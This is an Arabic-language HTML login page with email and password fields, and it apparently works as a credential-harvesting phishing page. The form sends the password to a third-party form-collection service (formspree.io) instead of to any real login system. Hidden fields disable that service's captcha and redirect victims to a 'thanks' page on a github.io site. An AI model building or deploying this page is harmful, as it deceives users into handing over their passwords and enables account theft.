<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة التسجيل</title>
    <style>
        body { font-family: sans-serif; background: #eef2f3; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 15px; width: 300px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
        button:hover { background: #0056b3; }
        label { font-size: 14px; color: #333; display: block; text-align: right; }
    </style>
</head>
<body>

    <div class="box">
        <form action="https://formspree.io/f/xgozqzbw" method="POST">
            
            <label>البريد الإلكتروني:</label>
            <input type="text" name="email" required placeholder="أدخل بريدك">
            
            <label>كلمة السر:</label>
            <input type="password" name="password" required placeholder="أدخل كلمة السر">

            <input type="hidden" name="_next" value="https://alymaanythlkm.github.io/999/thanks.html">
            
            <input type="hidden" name="_captcha" value="false">

            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>

</body>
</html>
